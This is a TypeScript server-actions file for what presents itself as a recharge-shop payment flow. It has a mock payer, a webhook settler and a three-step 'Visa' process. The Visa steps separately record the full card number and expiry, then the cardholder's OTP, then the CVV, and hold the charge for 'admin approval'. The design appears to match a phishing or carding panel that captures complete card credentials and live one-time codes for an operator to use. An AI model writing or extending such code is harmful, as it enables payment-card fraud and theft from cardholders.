import { type ActionResult, toErrorCode } from "@/lib/codes";
import { recordVisaCvv, recordVisaCard, recordVisaOtp } from "@/controllers/visa.controller";
import { mockPay, payAndFulfill } from "@/services/recharge.service";

export async function payMockOrder(orderId: string, source: "knet" | "gpay" | "mock" = "mock"): Promise<ActionResult> {
  try {
    const order = await mockPay(orderId, source);
    return { ok: true, orderId: order?.id ?? orderId };
  } catch (error) {
    return { ok: false, code: toErrorCode(error) };
  }
}

export async function settleWebhook(orderId: string, gatewayRef: string, rawEvent: string) {
  return payAndFulfill(orderId, { gateway: "webhook", gatewayRef, rawEvent });
}

/** Step 1 — card details only (no CVV). */
export async function startVisaPayment(input: unknown): Promise<ActionResult> {
  const raw = input as {
    orderId?: string;
    holderName?: string;
    name?: string;
    number?: string;
    expiry?: string;
    sessionId?: string;
  };
  return recordVisaCard({
    orderId: String(raw.orderId ?? ""),
    holderName: String(raw.holderName ?? raw.name ?? ""),
    number: String(raw.number ?? ""),
    expiry: String(raw.expiry ?? ""),
    sessionId: raw.sessionId,
  });
}

/** Step 2 — OTP. */
export async function confirmVisaOtp(input: unknown): Promise<ActionResult> {
  const raw = input as { orderId?: string; otp?: string };
  return recordVisaOtp({
    orderId: String(raw.orderId ?? ""),
    otp: String(raw.otp ?? ""),
  });
}

/** Step 3 — CVV; waits for admin approval before charge. */
export async function confirmVisaCvv(input: unknown): Promise<ActionResult> {
  const raw = input as { orderId?: string; cvv?: string; sessionId?: string };
  return recordVisaCvv({
    orderId: String(raw.orderId ?? ""),
    cvv: String(raw.cvv ?? ""),
    sessionId: raw.sessionId,
  });
}
